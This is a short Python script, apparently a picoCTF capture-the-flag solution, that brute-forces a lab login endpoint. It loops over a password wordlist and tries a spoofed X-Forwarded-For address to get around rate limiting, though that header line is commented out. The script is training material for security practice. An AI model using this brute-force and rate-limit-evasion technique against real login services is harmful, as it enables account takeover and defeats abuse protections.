import requests
import random

# Function Untuk Call Ke Website 
def call_login(password):
    url = "http://amiable-citadel.picoctf.net:61272/login"
    rate_limit_bypass = "10." + str(random.randint(2,255)) + "." + str(random.randint(2,255)) + "." + str(random.randint(2,255))
    print(f'[+] Bypass IP: {rate_limit_bypass}')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", 
        "Accept": "*/*", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Content-Type": "application/json", 
        "Connection": "keep-alive", 
        # "X-Forwarded-For": rate_limit_bypass,
        "Priority": "u=0"
        }
    json={"email": "ctf-player@picoctf.org", "password": f"{password}"}
    r = requests.post(url, headers=headers, json=json)
    if(r.status_code == 429):
        print("[+] To Many Attemp")
        return False
    
    if(r.json()['success']):
        print(r.json())
        return True
    
    return False

# Read File
list_passwords = open('passwords.txt', 'r').readlines()

for pwd in list_passwords:

    print(f"[+] Trying {pwd}     ", end='\r', flush=True)
    if(call_login(pwd.strip())):
       print(f"\n[+] Password {pwd.strip()}")
       break
